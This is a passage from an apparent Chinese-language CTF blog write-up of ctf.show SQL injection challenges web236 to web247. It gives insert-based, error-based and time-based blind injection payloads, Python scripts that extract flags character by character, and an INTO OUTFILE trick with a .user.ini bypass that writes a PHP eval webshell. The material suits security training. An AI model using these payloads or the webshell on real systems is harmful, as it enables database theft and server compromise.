class="hljs-number">23</span><br></code></pre></td></tr></table></figure><h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><p>多加了flag的过滤实际测试发现并没影响</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(table_name) from mysql.innodb_table_stats <span class="hljs-built_in">where</span> database_name=database())%23<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">password=\&amp;username=,username=(<span class="hljs-keyword">select</span> group_concat(o) from (<span class="hljs-keyword">select</span> 1,2 as o,3 union <span class="hljs-keyword">select</span> * from flaga)a)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;<br></code></pre></td></tr></table></figure><p>直接前端的页面插入就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#</span><br></code></pre></td></tr></table></figure><p>查询语句需要整体加括号，然后刷新看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;))#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select flagass23s3 from flag))#</span><br></code></pre></td></tr></table></figure><h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>&#x2F;&#x2F;过滤空格</p><p>尝试<code>/**/</code>失败，<code>%09</code>失败，尝试用括号进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;</span>flagb<span class="hljs-string">&#x27;)))#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(flag)from(flagb)))#</span><br></code></pre></td></tr></table></figure><h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>过滤空格 or ,同web235的内容，前端正常修改就行,测试了一下也是过滤空格的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#</span><br></code></pre></td></tr></table></figure><p>网上搜了一会字母查列，没有查询到，都是猜测的语句，可能是因为括号太多导致不符合sql语句的查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27;,(select(flag)from(flagbb)))#</span><br></code></pre></td></tr></table></figure><h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//过滤空格 or sys mysql<br></code></pre></td></tr></table></figure><p>压力🐎，都过滤了，跟着y4师傅的脚本敲了一遍，没回显但是可以去网站上看一下，会发现已经出flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><br>url = <span class="hljs-string">&#x27;http://f7b11a05-b447-4bfd-9850-395e7f32e9ef.challenge.ctf.show/&#x27;</span><br>url_insert = url + <span class="hljs-string">&quot;api/insert.php&quot;</span><br>url_flag = url + <span class="hljs-string">&quot;api/?page=1&amp;limit=1000&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_str_random</span>():<br>    sttr = <span class="hljs-string">&quot;ab&quot;</span><br>    str_list = [random.choice(sttr) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>    random_str = <span class="hljs-string">&#x27;&#x27;</span>.join(str_list)<br>    <span class="hljs-keyword">return</span> random_str<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;1&#x27;,(select(flag)from(flag<span class="hljs-subst">&#123;generate_str_random()&#125;</span>)))#&quot;</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&quot;aaa&quot;</span><br>    &#125;<br>    r = requests.post(url_insert, data=data)<br>    r2 = requests.get(url_flag)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> r2.text:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r2.json()[<span class="hljs-string">&#x27;data&#x27;</span>]:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> i[<span class="hljs-string">&#x27;pass&#x27;</span>]:<br>                <span class="hljs-built_in">print</span>(i[<span class="hljs-string">&#x27;pass&#x27;</span>])<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>正常输入语句不会有回显会直接删除，采用盲注</p><p>可以回溯到web175对脚本修改一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://5495de70-dd5c-41c5-bcab-d784b3e7f768.challenge.ctf.show/api/delete.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        <span class="hljs-comment">#payload = &#123;&quot;id&quot;: f&quot;0 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.2),0)&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&quot;id&quot;: f&quot;0 or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.2),0)&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;0 or if(substr((select flag from flag),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.2),0)&quot;</span>&#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>等的时间可能稍微长一点，跑出来是没什么问题的</p><h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>file注入，找不到注入点，看看wp，参考是在dump.php下，测试一下是成功的</p><p>这里可以通过into outfile来写入webshell,采用字段分割来写入,在&#x2F;api&#x2F;dump.php里面写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filename=1.php<span class="hljs-string">&#x27;lines terminated by &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;#</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-27002812.png" alt="2024-09-20114308"></p><h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>在上题的基础上过滤了php</p><p>尝试了大小写绕过没有成功，需要用到文件上传的知识，考虑使用<code>.user.ini</code>来进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filename=.user.ini<span class="hljs-string">&#x27; lines starting by &#x27;</span>auto_prepend_file=orange.txt\n<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filename=orange.txt<span class="hljs-string">&#x27; lines starting by &quot;&lt;?=eval($_POST[cmd]);?&gt;&quot;#</span><br></code></pre></td></tr></table></figure><p>这里注意由于过滤了php所以🐎里面也不能使用php，简单的绕过一下就可以了</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-27164204.png" alt="2024-09-27164204"></p><h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><p>error报错注入，先简单的进行一下测试注入，是get进行传参，有sleep可以成功，先看看前面的脚本能不能正常使用，进行简单的微调是可以得到flag的，也是时间等一等</p><h3 id="0x01-16"><a href="#0x01-16" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://414d893d-2ded-40da-9e5f-cb54d1dcb9a6.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;1&#x27; or if(substr((select flag from ctfshow_flag),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-16"><a href="#0x02-16" class="headerlink" title="0x02"></a>0x02</h3><p>利用报错注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;)),0x7e))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ctfshow_flag<span class="hljs-string">&#x27;)),0x7e))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select updatexml(1,concat(0x7e,(select flag from ctfshow_flag)),0x7e))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or(select updatexml(1,concat(0x7e,substring((select flag from ctfshow_flag),1),0x7e),0x7e))%23</span><br></code></pre></td></tr></table></figure><p>最后一步是因为第四步不能直接爆出所有的字符，需要微调一下内容，改动1那个位置</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>懒得写了，布尔盲注也是可以用的，而且应该比时间盲注快一点</p><hr><h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><p>先盲注脚本跑看看</p><h3 id="0x01-17"><a href="#0x01-17" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">import time<br>import requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://e7e68c52-a18f-469f-b68e-3e790007590b.challenge.ctf.show/api/&#x27;</span><br><br>def get_flag_char(index):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: f<span class="hljs-string">&quot;1&#x27; or if(substr((select flag1 from ctfshow_flagsa),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        try:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= 0.5:<br>                <span class="hljs-built_in">return</span> char<br>        except requests.RequestException as e:<br>            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;请求失败: &#123;e&#125;&quot;</span>)<br>    <span class="hljs-built_in">return</span> None<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 64):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;当前情况: &#123;flag&#125;&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-built_in">break</span><br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;最终情况: &#123;flag&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-17"><a href="#0x02-17" class="headerlink" title="0x02"></a>0x02</h3><p>过滤了updatexml,但是extractvalue还是可以正常使用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()))))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ctfshow_flagsa<span class="hljs-string">&#x27;))))%23</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=0<span class="hljs-string">&#x27;or (select extractvalue(1,concat(0x7e,substring((select flag1 from ctfshow_flagsa),-10))))%23</span><br></code></pre></td></tr></table></figure><p>最后一步也是一样需要微调拼接</p><h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>先看看盲注</p><h3 id="0x01-18"><a href="#0x01-18" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://2d7a2d28-52c4-4c83-90c5-1b8381016399.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;1&#x27; or if(substr((select flag2 from ctfshow_flags),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(0.1),0)#&quot;</span><br><br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="0x02-18"><a href="#0x02-18" class="headerlink" title="0x02"></a>0x02</h3><p>floor注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=1%27union+<span class="hljs-keyword">select</span>+1,count(*),concat((select+flag2+from+ctfshow_flags),<span class="hljs-number">0</span>x7e,floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))a+from+ctfshow_user+group+by+a--%20<br></code></pre></td></tr></table></figure><p>直接抄的wp，原理基本一致吧</p><h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>再上题的基础上过滤了floor，继续盲注</p><h3 id="0x01-19"><a href="#0x01-19" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,?&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://04452d8b-ead5-40c6-be43-a04620fe4583.challenge.ctf.show/api/&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-comment">#&quot;id&quot;: f&quot;1&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(0.1),0)#&quot;</span><br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">f&quot;1&#x27; or if(substr((SELECT `flag?` FROM ctfshow_flagsa),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span 